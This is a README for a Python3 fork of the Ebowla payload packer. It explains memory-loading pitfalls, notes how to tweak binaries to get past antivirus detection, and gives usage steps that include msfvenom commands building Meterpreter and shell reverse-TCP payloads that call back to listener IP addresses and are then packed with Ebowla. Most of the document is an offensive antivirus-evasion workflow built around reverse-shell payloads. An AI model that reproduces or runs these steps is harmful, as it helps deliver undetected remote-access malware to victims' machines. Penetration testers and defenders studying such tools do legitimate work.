# 3 B O W L A

## kazkansouh update notes

I have forked this WIP for `ebowla` being uplifted to `python3` and
tweaked it a little to get it to work (and understand how it works) -
atleast for simple usecases. Some points to note. I have only looked
at the environment encryption of the `Go` host application option
(which in turn makes use of [`MemoryModule`][MemoryModule]). Thus,
there are some pitfalls to the type of executables that can be loaded:

* The GO compiler configures the image base address of `0x400000` (the
  deafult for i686 executables). Thus, when the payload is placed into
  this address space, if it uses this location (i.e. it is i686 and
  combiled with MSVC or compiled with `mingw` then it might not work
  when it gets relocated and it does not expect it). There are two
  solutions to this problem:
  
    1. change the base address of the payload (during linking) see
       [[MSVC][msvcbase]], or
    2. compile the payload with dynamic base/position independent code
       [[MSVC][msvcdynamic]] so it fills out the reloaction table
       (this is the default on modern MSVC compilers, but not with
       `mingw`).
    
    Luckily, in the case of x86_64 programs when compiled by MSVC, the
    default image base is `0x140000000`, so its unlikely this will be
    occupied and can be loaded directly. Moreover, as MSVC enables
    dynamic base by default on modern compilers, these issues are
    minimised.
  
    In the case of compiling the payload with `mingw`, the easiest
    option is to simply append the `-Wl,--image-base,0x...` flag to
    kick out the default address from `0x400000` to something like
    `0x3C00000`. This applies to both `i686` and `x86_64` varianets of
    `mingw` as they both use the `0x400000` image base as
    default. Alternatively, add the `-pie` flag to fill out the
    relocation table and due to an [odd bug][mingwbug] its also needed
    to specify the entry point: for i686 `-Wl,-e_mainCRTStartup` and
    for x86_64 `-Wl,-emainCRTStartup`.
  
    As a side note: *Unfortunatly, the obvious soultion of changing the
    image base address away from `0x400000` for the host app does not
    work as it appears that its still not possible to allocate in this
    region (the memory still has the `MEM_RESERVE` flag set even when
    its not being used - I think its related to how Windows loaded the
    application image originally but not sure). Yet, even if this was
    possible to allocate here there are no assurances how much space
    could be allocated once Windows allocates space for threads, etc.*

* DLLs should not suffer these issues. However, of note the usual rule
  of thumb of not making certain API calls (such as creating threads)
  in the `dllmain` function do not apply here as its called like any
  normal function.

### Notes about AV Bypass

The compiled host application has some common strings/patterns that
get detected. However, from my experiance it does not take too much
work to identify which strings are being flagged and tweak the binary
accordinly.

At time of pushing this, the default `IAD` in the host binary appears
to flag up on Windows Defender. This is easy enough to tweak, however,
no evasions have been included in these patches for obvious reasons ;)


### Typical Usage: YMMV

For 64 bit:

```text
$ msfvenom -f exe -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=10.10.10.1 LPORT=4567 RC4PASSWORD=jojo > msf.exe
$ ./ebowla.py msf.exe your.config
$ ./build_go.sh x86_64 output/go_symmetric_msf.exe.go jojo.exe
```

Or for 32 bit:

```text
$ msfvenom -f dll -p windows/meterpreter/reverse_tcp_rc4 LHOST=10.10.14.6 LPORT=4445 RC4PASSWORD=jojo > msf32.dll
$ ./ebowla.py msf32.dll your.config
$ ./build_go.sh i686 output/go_symmetric_msf32.dll.go msf32.exe
```

**Below `\/\/` is the existing readme untouched**

## Ebowla Fork to add Python3 Support
### we are in the very beginning here - so not everything works.

When using go as payload type, most of the functionality should be implemeted and function properly. We decided against rewriting the functionality needed to use python as payload type, as cross compiling python executables on linux only really works through the usage of pyinstaller in wine - which is quite a hassle and an ugly solution, especially considering that GO as payload type can almost take over everything that python could and we, ourselves, never had to use python for it. 

## How to use Ebowla

This part is taken from a writeup I did for Ebowla with python2. With the added python3 support, none of the steps following change, at least not for the output type EXE. If we have time, we will provide documentation adjusted to python3 and other functionality. 

### edit generic.config:

change:

payload_type = GO

output_type = EXE

Set at least one environment variable (computername = hostname),
the name has to be exact, as Ebowla won't decrypt otherwise.

### creating payload

Here used as an example, a reverse shell made with mfsvenom:

```msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -a x64 -o shell.exe```

### building executable with Ebowla

```python3 ebowla.py shell.exe genetic.config```

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-42.png?token=ANDZTD52FKYQIOMKV3RBKUC56NLDI)

```./build_x64_go.sh output/<outputfilefromfirststeps> <finalfilename>```

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-47.png?token=ANDZTDZ4WQD7BAUW45VQUWK56NLHO)

The finished, packed executable can be found in the **output** folder.

### Results!

### without Ebowla

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-50.png?token=ANDZTD3RLAGGH5XC3FN3A2S56NLMI)

### same executable with the use of Ebowla

![](https://raw.githubusercontent.com/ohoph/cheatsheats/master/ebowla/images/2019-12-13_09-52.png?token=ANDZTD3BMQF7CAHDMEHEVZC56NLMQ)

[MemoryModule]: https://github.com/fancycode/MemoryModule "GitHub.com: MemoryModule - API to load dll from memory"
[msvcbase]: https://docs.microsoft.com/en-us/cpp/build/reference/base-base-address "Microsoft.com: /BASE"
[msvcdynamic]: https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomization "Microsoft.com: /DYNAMICBASE"
[mingwbug]: https://sourceforge.net/p/mingw-w64/mailman/message/31034877/ "[Mingw-w64-public] ASLR/--dynamicbase and -pie with MinGW-w64"
